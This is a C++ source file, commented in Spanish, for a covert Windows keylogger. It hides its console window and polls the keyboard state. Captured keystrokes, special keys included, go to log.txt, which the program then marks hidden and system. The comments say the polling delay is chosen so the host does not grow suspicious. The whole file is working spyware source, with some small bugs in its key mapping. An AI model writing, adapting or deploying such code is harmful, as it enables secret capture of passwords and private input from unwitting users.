#include <iostream>
#include <stdio.h>

#include <windows.h>


using namespace std;

bool mayus = false;

string getKey(int k);

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE); // Escondemos la ventana del ejecutador
	
	int key;
	string word;
	
	bool execute = true;
	
	FILE *log;
    log = fopen("log.txt", "a+");
	
	if(!log)
		return 1;
	
	while(execute){
		
		for (key = 8; key<=90; key++){
			
			/*
			*
			* GetAsyncKeyState devuelve 16 bits y según la documentación:
			* el bit de mas valor activado: la tecla se mantiene presionada
			* el bit de menos valor activado: la tecla ha sido presionada una vez
			* el resto de bits no tiene ninguna funcion
			*
			* lo que nos interesa es detectar que ha sido presionada, asi que hacemos una mascara con el bit de menos valor
			*/
			if(GetAsyncKeyState(key) & 0x0001){ 
				if(key == 27) execute = false;
				
				word = getKey(key);
				
				fprintf(log,"%s",word.c_str());
			}
		}
		
		Sleep(50); 	// Esperamos 50 milisegundos para no consumir todos los recursos del procesador y que el host no sospeche
					// si esperamos mucho mas tal vez no registremos las teclas pusladas en el orden correcto
	}
	
	fclose(log);
	system("attrib +h +s log.txt"); // Por ultimo hacemos que el archivo quede oculto
	
	return 0;
}


// Esta funcion es la encargada de mappear las teclas especiales a un formato entendible
string getKey(int k){
	string key;
	
	switch(k){
		case 8:
			key = "[BACKSPACE]";
			break;
		case 13:
			key = "\n";
			break;
		case 20:
			key = "[MAYUS]";
			mayus = !mayus;
			break;
		case 32:
			key = " ";
			break;
		case VK_TAB:        
			key = "[TAB]";
			break;
		case VK_SHIFT:
			key = "[SHIFT]";
			break;
		case VK_CONTROL:
			key = "[CONTROL]";
			break;
		case VK_ESCAPE:
			key = "[ESCAPE]";
			break;
		case VK_END:
			key = "[END]";
			break;
		case VK_HOME:
			key = "[HOME]";
			break;
		case VK_LEFT:
			key = "[LEFT]";
			break;
		case VK_UP:
			key = "[UP]";
			break;
		case VK_RIGHT:
			key = "[RIGHT]";
			break;
		case VK_DOWN:
			key = "[DOWN]";
			break;
		case 190 || 110:
			key = ".";
			break;
		default:
			if(!mayus)
				key = tolower(char(k));
			else
				key = char(k);
			break;
	}
	return key;
	
}
